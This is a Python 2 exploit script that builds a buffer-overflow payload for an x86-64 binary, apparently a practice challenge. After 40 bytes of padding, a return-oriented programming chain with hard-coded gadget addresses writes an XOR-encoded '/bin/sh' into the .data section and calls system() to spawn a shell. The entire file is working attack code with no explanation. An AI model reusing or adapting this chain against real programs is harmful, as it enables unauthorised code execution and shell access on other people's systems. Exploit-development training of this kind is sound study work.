import struct
import pdb

def stringpacker(addr):

    return str(struct.pack("<Q",addr))

def padString(inputString, width):
    if len(inputString) % width == 0:
	inputString += "\x00" * width
    else:
	inputString += (width-(len(inputString)%width)) * "\x00"
    return inputString


def encodeString(inputString, xorByte, width):
    inputString = padString(inputString,width)

    inputStringBytes = bytearray(inputString)

    encodedString = ""

    for i in range(0,len(inputStringBytes),width):
	xorVal = inputStringBytes[i] ^ xorByte # we encode only the first byte of the string with XOR
	encodedString += chr(xorVal)
        encodedString += inputString[i+1:i+width]

    return encodedString


def writeStringToLocation(inputString, location, width):

    ropchain = ""

    inputString_encoded = encodeString(inputString,0xFF,width)
    for i in range(0,len(inputString_encoded),width):

# Step 1: Move destination address in r10
        ropchain += stringpacker(pop_r12)
        ropchain += stringpacker(data_section + i)
#r12 now contains our data section

        ropchain += stringpacker(zero_r11)
        ropchain += "B"*width # junk to pop into r14
        ropchain += stringpacker(copy_r11_r12)
        ropchain += "B"*width # junk to pop into r12
#r11 contains now our data section

        ropchain += stringpacker(xchg_r11_r10)
        ropchain += "B"*width # junk to pop into r15

# Step 2: Move encoded string into edx

        ropchain += stringpacker(pop_r12)
        ropchain += inputString_encoded[i:i+width]
#r12 now contains our encoded string

        ropchain += stringpacker(zero_r11)
        ropchain += "B"*width # junk to pop into r14
        ropchain += stringpacker(copy_r11_r12)
        ropchain += "B"*width # junk to pop into r12
#r11 contains now our encoded string

# Step 3: move the encoded string to our target location and decode it

        ropchain += stringpacker(mov_r10ptr_r11)
        ropchain += "B" * width # junk to pop into r13
        ropchain += "\xFF" * width  # 0xFFFFFFFF... to pop into r12, which will be used for decoding the first byte

    return ropchain

crap = "A" * 40

pop_r12 = 0x0000000000400832 # pop r12; mov r13d, 0x604060; ret;
zero_r11 = 0x0000000000400822 # xor r11, r11; pop r14; mov edi, 0x601050; ret;
copy_r11_r12 = 0x000000000040082f # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
xchg_r11_r10 = 0x0000000000400840 #xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
mov_r10ptr_r11 = 0x000000000040084e # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
data_section = 0x601050 # .data section
system_plt = 0x4005e0 # system@plt
pop_rdi = 0x00000000004008c3 # pop rdi; ret;

cmd_string = "/bin/sh"

ropchain = writeStringToLocation(cmd_string,data_section,8)

# Step 4: POP the string start address into RDI

ropchain += stringpacker(pop_rdi)
ropchain += stringpacker(data_section)

# Step 5: Call system
ropchain += stringpacker(system_plt)


payload = crap


payload += ropchain
if len(payload) > 512:
    exit("Payload size is limited to 512 bytes, choose a shorter command string!")


print(payload)


